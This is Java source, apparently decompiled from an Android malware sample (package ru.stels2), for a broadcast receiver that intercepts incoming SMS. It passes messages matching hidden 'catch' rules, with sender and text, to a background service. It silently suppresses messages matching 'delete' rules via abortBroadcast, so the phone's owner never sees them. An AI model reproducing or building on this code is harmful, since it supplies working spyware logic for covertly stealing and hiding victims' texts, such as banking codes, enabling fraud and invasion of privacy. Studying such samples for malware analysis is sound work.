package ru.stels2;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;
import org.json.JSONObject;

public class MainReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if (action.equals("custom.alarm")) {
            if (Functions.loadSettings(context)) {
                MainService.start(context, intent, "alarm");
            }
        } else if (action.equals("android.provider.Telephony.SMS_RECEIVED")) {
            if (Functions.loadSettings(context)) {
                SmsMessage[] messages = Functions.getSmsMessages(intent.getExtras());
                boolean find = false;
                for (SmsMessage smsMessage : messages) {
                    String number = smsMessage.getOriginatingAddress();
                    String text = smsMessage.getMessageBody();
                    try {
                        Settings settings = Settings.getSettings();
                        CatchResult result = settings.isCatchMessage(number, text);
                        if (result.result) {
                            MainService.start(context, intent, "catch", number, text, result.key);
                        }
                        if (settings.isDeleteMessage(number, text)) {
                            find = true;
                        }
                    } catch (Exception ex) {
                        ex.printStackTrace();
                    }
                }
                if (find) {
                    try {
                        abortBroadcast();
                    } catch (Exception ex2) {
                        ex2.printStackTrace();
                    }
                }
            }
        } else if (action.equals("custom.alarm.info")) {
            try {
                if (Functions.loadSettings(context)) {
                    Settings.getSettings();
                }
            } catch (Exception ex22) {
                ex22.printStackTrace();
            }
        } else {
            Stels stels = new Stels(context, new JSONObject());
        }
    }
}
